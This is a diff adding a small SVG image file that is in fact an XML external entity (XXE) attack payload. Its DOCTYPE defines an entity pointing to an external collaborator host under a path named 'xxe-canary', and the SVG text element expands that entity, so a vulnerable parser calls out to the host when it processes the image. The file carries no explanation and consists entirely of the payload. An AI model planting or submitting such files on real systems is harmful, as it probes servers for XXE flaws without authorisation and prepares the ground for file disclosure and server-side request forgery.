@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://5038zsi11ju8mm1oxytxwbu980er2kq9.oastify.com/xxe-canary">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
+  <text x="10" y="30">&xxe;</text>
+</svg>
